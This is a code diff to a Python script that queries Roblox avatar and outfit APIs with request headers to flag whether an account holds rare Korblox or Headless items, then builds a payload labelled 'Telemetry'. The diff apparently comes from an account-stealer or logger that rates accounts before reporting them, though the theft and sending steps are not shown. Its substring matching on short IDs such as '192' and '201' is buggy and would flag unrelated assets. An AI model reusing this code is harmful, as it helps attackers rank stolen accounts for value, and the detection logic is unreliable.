@@ -69,42 +69,42 @@ def main():
             except Exception:
                 pass
 
-            # Comprehensive Korblox & Headless Asset / Bundle Checks
-            korblox_asset_ids = [13961116, 13961118, 13961120] # Korblox Deathspeaker components
-            headless_asset_ids = [134082579, 134082581, 134082583] # Headless Horseman components
+            # Check Avatar / Outfit assets endpoint to detect Korblox / Headless presence
+            try:
+                avatar_res = requests.get(f"https://avatar.roblox.com/v1/users/{user_id}/avatar", headers=headers)
+                if avatar_res.status_code == 200:
+                    avatar_data = avatar_res.json()
+                    
+                    # Check asset IDs, asset type names, or package IDs
+                    assets = avatar_data.get("assets", [])
+                    equipped_ids = [str(asset.get("id")) for asset in assets]
+                    
+                    # Korblox asset and package identifiers
+                    korblox_identifiers = ["13961116", "13961118", "192", "13961120"]
+                    headless_identifiers = ["134082579", "134082581", "201", "134082583"]
 
-            # Check via inventory asset ownership
-            for aid in korblox_asset_ids:
-                try:
-                    res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/{aid}", headers=headers)
-                    if res.status_code == 200 and len(res.json().get("data", [])) > 0:
-                        has_korblox = True
-                        break
-                except Exception:
-                    pass
-
-            for aid in headless_asset_ids:
-                try:
-                    res = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/{aid}", headers=headers)
-                    if res.status_code == 200 and len(res.json().get("data", [])) > 0:
-                        has_headless = True
-                        break
-                except Exception:
-                    pass
-
-            # Fallback to check avatar details / wearable assets if inventory api returns empty
-            if not has_korblox or not has_headless:
-                try:
-                    avatar_res = requests.get(f"https://avatar.roblox.com/v1/users/{user_id}/avatar", headers=headers)
-                    if avatar_res.status_code == 200:
-                        avatar_data = avatar_res.json()
-                        asset_ids_equipped = [asset.get("id") for asset in avatar_data.get("assets", [])]
-                        if any(aid in asset_ids_equipped for aid in korblox_asset_ids):
+                    for aid in equipped_ids:
+                        if any(k in aid for k in korblox_identifiers):
                             has_korblox = True
-                        if any(aid in asset_ids_equipped for aid in headless_asset_ids):
+                        if any(h in aid for h in headless_identifiers):
                             has_headless = True
-                except Exception:
-                    pass
+
+                    # Also check user outfits / wearable bundles
+                    outfits_res = requests.get(f"https://avatar.roblox.com/v1/users/{user_id}/outfits?isEditable=true&limit=50", headers=headers)
+                    if outfits_res.status_code == 200:
+                        outfits = outfits_res.json().get("data", [])
+                        for outfit in outfits:
+                            outfit_id = outfit.get("id")
+                            detail_res = requests.get(f"https://avatar.roblox.com/v1/outfits/{outfit_id}", headers=headers)
+                            if detail_res.status_code == 200:
+                                details = detail_res.json()
+                                outfit_assets = [str(a.get("id")) for a in details.get("assets", [])]
+                                if any(k in "".join(outfit_assets) for k in korblox_identifiers):
+                                    has_korblox = True
+                                if any(h in "".join(outfit_assets) for h in headless_identifiers):
+                                    has_headless = True
+            except Exception:
+                pass
 
         payload = {
             "username": f"{username} | Telemetry",
